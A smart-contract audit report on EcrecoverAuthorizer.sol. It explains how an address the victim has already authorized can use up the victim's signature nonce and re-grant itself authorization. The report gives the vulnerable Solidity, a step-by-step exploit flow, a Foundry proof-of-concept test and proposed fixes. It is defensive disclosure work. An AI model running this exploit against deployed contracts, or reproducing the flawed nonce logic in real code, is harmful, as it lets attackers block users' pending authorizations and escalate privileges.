Audit Report

## Title
Midnight-authorized agent can advance victim's `EcrecoverAuthorizer` nonce and invalidate all pending signed authorizations - (File: src/periphery/EcrecoverAuthorizer.sol)

## Summary
`EcrecoverAuthorizer.setIsAuthorized` allows any address that `IMidnight.isAuthorized(authorization.authorizer, signer)` returns `true` for to sign and submit an `Authorization` struct naming an arbitrary victim as `authorizer`. Because the nonce consumed is `nonce[authorization.authorizer]` (the victim's), not the signer's, a Midnight-authorized agent can craft a self-signed authorization for the victim, pass the authorization check via path 2, and permanently advance the victim's nonce — without ever holding the victim's private key. This invalidates all pre-signed `Authorization` structs the victim has distributed.

## Finding Description

**Code path** — `src/periphery/EcrecoverAuthorizer.sol` lines 24–48:

```solidity
function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
    require(block.timestamp <= authorization.deadline, Expired());
    require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // ← victim's nonce consumed

    address signer = ecrecover(digest, signature.v, signature.r, signature.s);
    require(signer != address(0), InvalidSignature());
    require(
        signer == authorization.authorizer                                          // path 1: victim signs
            || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer), // path 2: authorized agent signs
        Unauthorized()
    );
    IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
}
```

**Root cause** — The nonce consumed is `nonce[authorization.authorizer]` (the victim's), but path 2 permits any address the victim has previously authorized on Midnight to be the signer. The attacker supplies `authorization.authorizer = victim`, signs the struct with their own key, and the transaction succeeds end-to-end: the nonce check passes (attacker reads the current public nonce), the signature check passes via path 2, and the nonce is permanently incremented.

**Exploit flow:**
1. Victim `V` has previously called `midnight.setIsAuthorized(attacker, true, V)` for any legitimate purpose (relayer, keeper, bundler).
2. Victim distributes off-chain signed `Authorization(authorizer=V, authorized=X, isAuthorized=true, nonce=N)` to legitimate agents.
3. Attacker reads `ecrecoverAuthorizer.nonce(V)` → `N`.
4. Attacker constructs `Authorization(authorizer=V, authorized=attacker, isAuthorized=true, nonce=N, deadline=block.timestamp+1)` and signs it with their own key.
5. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.
6. Nonce check passes; `nonce[V]` is incremented to `N+1`.
7. Signature check: `signer = attacker`, `isAuthorized(V, attacker) = true` → passes.
8. Transaction succeeds. All victim's pre-signed authorizations carrying `nonce=N` now revert with `InvalidNonce`.
9. Attacker repeats with `nonce=N+1`, `N+2`, … keeping the victim's nonce perpetually ahead.

**Secondary impact** — Step 7 also executes `IMidnight.setIsAuthorized(attacker, true, V)`, granting the attacker a fresh Midnight authorization on behalf of the victim. Even if the victim later revokes the attacker's Midnight delegation, the attacker can re-grant it to themselves via this path before the revocation is mined.

**Why existing checks fail** — The `Unauthorized()` guard is satisfied by path 2 using the attacker's own Midnight delegation. There is no requirement that the signer must equal `authorization.authorizer` when consuming the nonce. The Certora README (`certora/README.md` line 63) describes the property as "a successful call increments only the **signer's** nonce," but the spec and code both increment `nonce[authorization.authorizer]`, not `nonce[signer]` — confirming the design intent diverges from the implementation description.

## Impact Explanation
Any victim who has ever granted Midnight authorization to any address can have their `EcrecoverAuthorizer` nonce advanced at will, permanently invalidating all pending signed `Authorization` structs. This blocks every action gated behind a pre-signed EcrecoverAuthorizer delegation: `take`, `repay`, `withdraw`, `liquidate`, and `claimFee`. Additionally, the attacker can use the same path to grant themselves (or any address) Midnight authorization on behalf of the victim, constituting unauthorized privilege escalation. Both impacts are concrete, on-chain, and irreversible per transaction.

## Likelihood Explanation
The precondition — victim has authorized attacker on Midnight — is the normal operating state for any user who delegates to a relayer, keeper, or bundler. The attack requires no special role, no leaked keys, and no governance access. It is permissionless beyond the precondition, repeatable indefinitely, automatable to front-run every legitimate submission, and costs only gas per increment.

## Recommendation
**Option 1 (minimal fix):** Verify the signature before consuming the nonce. Move the nonce increment after the `Unauthorized()` check so that a failed signature check does not consume the nonce. This does not fully close the path-2 nonce-griefing vector but prevents nonce consumption on failed calls.

**Option 2 (correct fix):** Restrict nonce consumption to path 1 only. Only the authorizer themselves (`signer == authorization.authorizer`) may consume `nonce[authorization.authorizer]`. If path 2 (agent delegation) is desired, the agent should sign using their own nonce (`nonce[signer]`), not the authorizer's. This aligns with the stated design intent in the Certora README.

**Option 3 (alternative):** Remove path 2 entirely from `EcrecoverAuthorizer`. Agents who need to submit on behalf of a user should relay the user's own pre-signed message, not sign a new one themselves.

## Proof of Concept

```solidity
// Foundry test — add to test/SetIsAuthorizedWithSigTest.sol

function testAttackerAdvancesVictimNonce() public {
    address victim = borrower;
    address attacker = lender; // attacker has been authorized by victim on Midnight

    // Step 1: victim authorizes attacker on Midnight (normal operating condition)
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Step 2: victim also authorizes EcrecoverAuthorizer on Midnight (required for the periphery to work)
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

    // Step 3: victim pre-signs an authorization at nonce=0
    Authorization memory victimAuth = makeAuthorization(victim, makeAddr("someTarget"), true);
    Signature memory victimSig = signAuthorization(victimAuth, victim);
    // victimAuth.nonce == 0

    // Step 4: attacker crafts and self-signs an authorization naming victim as authorizer
    Authorization memory attackAuth = Authorization({
        authorizer: victim,
        authorized: attacker,
        isAuthorized: true,
        nonce: ecrecoverAuthorizer.nonce(victim), // reads nonce=0
        deadline: block.timestamp + 1 days
    });
    Signature memory attackSig = signAuthorization(attackAuth, attacker);

    // Step 5: attacker submits — transaction succeeds, victim's nonce advances to 1
    ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);
    assertEq(ecrecoverAuthorizer.nonce(victim), 1);

    // Step 6: victim's pre-signed authorization is now invalid
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);
}
```